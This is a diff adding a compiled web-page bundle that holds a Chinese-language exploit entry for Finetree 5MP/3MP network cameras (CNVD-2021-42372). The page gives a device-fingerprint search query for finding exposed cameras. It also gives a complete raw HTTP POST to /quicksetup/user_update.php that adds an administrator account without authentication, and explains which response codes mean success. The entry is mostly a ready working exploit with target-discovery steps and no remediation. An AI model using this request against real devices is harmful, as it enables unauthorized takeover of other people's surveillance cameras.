@@ -1,0 +1,15 @@
+import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as i,e as n}from"./app-58e4a7d6.js";const t={},r=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Finetree 5MP 摄像机 user_pop.php文件存在未授权任意用户添加，攻击者添加后可以获取后台权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Finetree 5MP
+Finetree 3MP
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;Finetree-5MP-Network-Camera&quot;
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191628247.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>存在漏洞的文件 user_pop.php</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191630679.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /quicksetup/user_update.php HTTP/1.1
+Host: 
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
+Content-Length: 58
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=fn4qnpv5c8a2jgvf53vs1gufm6
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
+
+method=add&amp;user=admin1234&amp;pwd=admin1234&amp;group=2&amp;ptz_enable=0
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以Burpsuite发送POST请求</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191632366.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>或者HackBar发送POST请求，返回200即为添加成功，返回804则为用户重复</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191631102.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>利用添加的账户可以登录后台</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191634048.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,18),d=[r];function s(p,l){return a(),i("div",null,d)}const u=e(t,[["render",s],["__file","Finetree 5MP 摄像机 user_pop.php 任意用户添加漏洞 CNVD-2021-42372.html.vue"]]);export{u as default};
